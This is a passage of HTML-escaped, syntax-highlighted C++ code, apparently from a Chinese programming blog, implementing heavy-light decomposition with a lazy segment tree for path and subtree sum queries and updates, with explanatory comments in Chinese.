class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//-------------------------------------- 以下为线段树 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;pushdown&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; rt,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; lenn)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    laz[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+=laz[rt];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    laz[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+=laz[rt];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+=laz[rt]*(lenn-(lenn&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+=laz[rt]*(lenn&amp;gt;&amp;gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]%=mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]%=mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    laz[rt]=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;build&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; rt,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(l==r)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[rt]=wt[l];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(a[rt]&amp;gt;mod)a[rt]%=mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(lson);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;build&lt;/span&gt;(rson);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    a[rt]=(a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;query&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; rt,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; L,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; R)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L&amp;lt;=l&amp;amp;&amp;amp;r&amp;lt;=R) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	res+=a[rt];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	res%=mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(laz[rt])&lt;span class=&#34;built_in&#34;&gt;pushdown&lt;/span&gt;(rt,len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L&amp;lt;=mid)&lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(lson,L,R);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(R&amp;gt;mid)&lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(rson,L,R);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;update&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; rt,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; l,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; r,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; L,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; R,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L&amp;lt;=l&amp;amp;&amp;amp;r&amp;lt;=R) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        laz[rt]+=k;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[rt]+=k*len;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(laz[rt])&lt;span class=&#34;built_in&#34;&gt;pushdown&lt;/span&gt;(rt,len);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(L&amp;lt;=mid)&lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(lson,L,R,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(R&amp;gt;mid)&lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(rson,L,R,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        a[rt]=(a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;]+a[rt&amp;lt;&amp;lt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;|&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;])%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//---------------------------------以上为线段树 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;qRange&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; ans=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(top[x]!=top[y]) &amp;#123;&lt;span class=&#34;comment&#34;&gt;//当两个点不在同一条链上 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[top[x]]&amp;lt;dep[top[y]])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        	&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x,y);&lt;span class=&#34;comment&#34;&gt;//把x点改为所在链顶端的深度更深的那个点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        res=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[top[x]],id[x]);&lt;span class=&#34;comment&#34;&gt;//ans加上x点到x所在链顶端 这一段区间的点权和&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans+=res;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ans%=mod;&lt;span class=&#34;comment&#34;&gt;//按题意取模 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x=fa[top[x]];&lt;span class=&#34;comment&#34;&gt;//把x跳到x所在链顶端的那个点的上面一个点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//直到两个点处于一条链上&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[x]&amp;gt;dep[y])&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x,y);&lt;span class=&#34;comment&#34;&gt;//把x点深度更深的那个点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[x],id[y]);&lt;span class=&#34;comment&#34;&gt;//这时再加上此时两个点的区间和即可&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ans+=res;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; ans%mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;updRange&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//同上&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    k%=mod;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt;(top[x]!=top[y])&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[top[x]]&amp;lt;dep[top[y]])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        	&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x,y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[top[x]],id[x],k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        x=fa[top[x]];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(dep[x]&amp;gt;dep[y])&lt;span class=&#34;built_in&#34;&gt;swap&lt;/span&gt;(x,y);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[x],id[y],k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;qSon&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    res=&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;query&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[x],id[x]+siz[x]&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//子树区间右端点为id[x]+siz[x]-1 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; res;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;updSon&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; k)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//同上&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;update&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,n,id[x],id[x]+siz[x]&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;,k);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dfs1&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; f,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; deep)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//x当前节点，f父亲，deep深度 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    dep[x]=deep;&lt;span class=&#34;comment&#34;&gt;//标记每个点的深度 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fa[x]=f;&lt;span class=&#34;comment&#34;&gt;//标记每个点的父亲 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    siz[x]=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//标记每个非叶子节点的子树大小 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; maxson=&lt;span class=&#34;number&#34;&gt;-1&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//记录重儿子的儿子数 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(Rint i=beg[x];i;i=nex[i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y=to[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(y==f)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        	&lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//若为父亲则continue &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;dfs1&lt;/span&gt;(y,x,deep+&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//dfs其儿子 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        siz[x]+=siz[y];&lt;span class=&#34;comment&#34;&gt;//把它的儿子数加到它身上 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(siz[y]&amp;gt;maxson)son[x]=y,maxson=siz[y];&lt;span class=&#34;comment&#34;&gt;//标记每个非叶子节点的重儿子编号 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;inline&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;dfs2&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; x,&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; topf)&lt;/span&gt; &lt;span class=&#34;comment&#34;&gt;//x当前节点，topf当前链的最顶端的节点 &lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    id[x]=++cnt;&lt;span class=&#34;comment&#34;&gt;//标记每个点的新编号 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    wt[cnt]=w[x];&lt;span class=&#34;comment&#34;&gt;//把每个点的初始值赋到新编号上来 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    top[x]=topf;&lt;span class=&#34;comment&#34;&gt;//这个点所在链的顶端 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(!son[x])&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    	&lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;span class=&#34;comment&#34;&gt;//如果没有儿子则返回 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(son[x],topf);&lt;span class=&#34;comment&#34;&gt;//按先处理重儿子，再处理轻儿子的顺序递归处理 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(Rint i=beg[x];i;i=nex[i]) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; y=to[i];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(y==fa[x]||y==son[x])&lt;span class=&#34;keyword&#34;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;dfs2&lt;/span&gt;(y,y);&lt;span class=&#34;comment&#34;&gt;//对于每一个轻儿子都有一条从它自己开始的链 &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(n);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(m);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(r);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(mod);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(Rint i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;=n;i++)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(w[i]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt;(Rint i=&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;i&amp;lt;n;i++) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; a,b;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(a);&lt;span class=&#34;built_in&#34;&gt;read&lt;/span&gt;(b);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(a,b);&lt;span class=&#34;built_in&#34;&gt;add&lt;/span&gt;(b,a);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;dfs1&lt;/span&gt;(r,&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;,&lt;span 